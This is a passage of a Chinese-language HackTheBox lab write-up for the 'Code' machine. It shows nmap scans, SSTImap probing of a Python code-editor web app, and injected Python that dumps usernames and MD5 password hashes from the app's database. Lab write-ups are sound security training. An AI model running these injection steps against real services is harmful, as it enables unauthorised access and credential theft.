cause retransmission \u003cspan class=\"hljs-built_in\"\u003ecap\u003c/span\u003e hit (10).\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.62\nHost is up (0.84s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n5000/tcp open  upnp\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 33.23 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e新端口是一个代码编辑器\u003ccode\u003ePython Code Editor\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/Code  nmap -sT -A -T4 -O -p 22,5000 10.10.11.62     \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:30 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.62\nHost is up (0.20s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:\u003cspan class=\"hljs-built_in\"\u003edf\u003c/span\u003e:51:a2:7a:bd (RSA)\n|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)\n|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)\n5000/tcp open  http    Gunicorn 20.0.4\n|_http-title: Python Code Editor\n|_http-server-header: gunicorn/20.0.4\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   204.69 ms 10.10.16.1\n2   156.61 ms 10.10.11.62\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 34.11 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWEB 渗透\u003c/h2\u003e\n\u003cp\u003e可以执行python命令，首先尝试一下\u003ccode\u003eos\u003c/code\u003e 库\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Code/image56.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e提示\u003ccode\u003eUse of restricted keywords is not allowed.\u003c/code\u003e 经过测试是将\u003ccode\u003eimport\u003c/code\u003e 、\u003ccode\u003eos\u003c/code\u003e 等关键字给过滤了\u003c/p\u003e\n\u003cp\u003e右边可以创建账户，这里创建了用户\u003ccode\u003esunset\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Code/image57.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以看到存在\u003ccode\u003eMyCodes\u003c/code\u003e ，我们将代码保存为\u003ccode\u003etest\u003c/code\u003e试试\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Code/image58.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e尝试一下语法注入\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Code/image59.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以成功回显，再尝试一下使用模板语法\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Code/image60.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e也是成功回显了，那么该应用是使用\u003ccode\u003eFlask\u003c/code\u003e搭建的\u003ccode\u003eWeb\u003c/code\u003e应用\u003c/p\u003e\n\u003cp\u003e使用\u003ccode\u003eSSTImap\u003c/code\u003e尝试模板注入\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epython sstimap.py -u http://10.10.11.62:5000/run_code -H \u003cspan class=\"hljs-string\"\u003e'application/x-www-form-urlencoded; charset=UTF-8'\u003c/span\u003e -m \u003cspan class=\"hljs-string\"\u003e'POST'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e'code=print(render_template_string(\"{{*}}\"))'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e结果就是没办法利用，但是知道了存在\u003ccode\u003ejinja2\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Code/image61.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e因为存在登陆操作，所以可能可以进行操作数据库，尝试一下数据库语法\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Code/image62.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e有回显，通过\u003ccode\u003eGPT\u003c/code\u003e进行构造\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ecode=\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e([user.username \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e User.query.all()])\n// output\n{\u003cspan class=\"hljs-string\"\u003e\"output\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"['development', 'martin', 'test']\\n\"\u003c/span\u003e}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\ncode=\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e([user.password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e user \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e User.query.all()])\n// output\n{\u003cspan class=\"hljs-string\"\u003e\"output\"\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e\"['759b74ce43947f5f4c91aeddc3e5bad3', '3de6f30c4a09c27fc71932bfc68474be', '098f6bcd4621d373cade4e832627b4f6']\\n\"\u003c/span\u003e}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到两组用户名密码\u003ccode\u003edevelopment:759b74ce43947f5f4c91aeddc3e5bad3\u003c/code\u003e 和\u003ccode\u003emar
